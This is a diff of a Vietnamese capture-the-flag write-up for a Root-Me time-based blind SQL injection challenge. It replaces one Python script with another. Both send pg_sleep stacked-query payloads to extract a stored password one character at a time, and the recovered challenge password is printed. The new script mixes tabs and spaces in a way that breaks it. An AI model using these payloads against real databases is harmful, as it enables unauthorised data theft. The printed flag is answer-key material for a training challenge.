@@ -65,32 +65,37 @@ Vậy tìm được tên column ở hàng thứ 5 là password với tên bảng
 
 Thử như vậy ta được length của password hàng 1 có độ dài là 13
 
-Nhưng bằng cách trên mình thấy bruteforce bằng burpsuite khá lâu, nên ta có thể tham khảo script sau sẽ nhanh hơn: 
+Nhưng bằng cách trên mình thấy bruteforce bằng burpsuite khá lâu, nên ta viết script như sau sẽ nhanh hơn nhiều:  
 
 ```
-import urllib, time
-import http.client as httplib
-import re
-
-for y in range(1,14):	
-	for x in range(33,127):
-		headers = {'Accept':'text/html','cookie':'PHPSESSID=------------------'}
-
-		conn = httplib.HTTPConnection("challenge01.root-me.org")
-		conn.request("GET","/web-serveur/ch40/?action=member&member=1;select+case+when+substr((select+password+from+users+limit+1+offset+0),"+str(y)+",1)=chr("+str(x)+")+then+pg_sleep(5)+else+pg_sleep(0)+end--",'',headers)
-		start=time.time()
-		response = conn.getresponse()
-		end=time.time()
-	
-		if end-start > 2 :
-			print("count: ", y)
-			print ("x : ", x)
-			break
-conn.close()
+import requests
+import string
+import time
+url='http://challenge01.root-me.org/web-serveur/ch40/'
+passwd = ''
+i=1
+for i in range(1,14):
+    for c in range(33,127):
+        payload = f"1; select case when (substring((select (password) from users limit 1),{i},1) = chr({c})) then pg_sleep(5) else pg_sleep(0) end --"
+        params = {'action':'member','member':payload}
+        start = time.time()
+        r=requests.get(url,params=params)
+        end = time.time()  
+        response_time = end - start
+        if response_time > 2:
+            print("count: ", i)
+            print("c :",c)
+	    text = chr(c)
+	    passwd+=text
+            break
+print(passwd)
 
 ```
+![image](https://user-images.githubusercontent.com/104350480/221499083-ac672ca7-1be4-443d-a309-a9a29f874425.png)
 
 Ta chuyển đổi về dạng char về text thì được : T!m3B@s3DSQL!
 
-![image](https://user-images.githubusercontent.com/104350480/221489365-0311d5b6-3ff9-4e4c-868a-cd2da2142d93.png)
+### Một cách khác nữa là ta dùng sql map cho nhanh, khi hiểu được cách làm r thì dùng tool thôi :(((
+
+
 
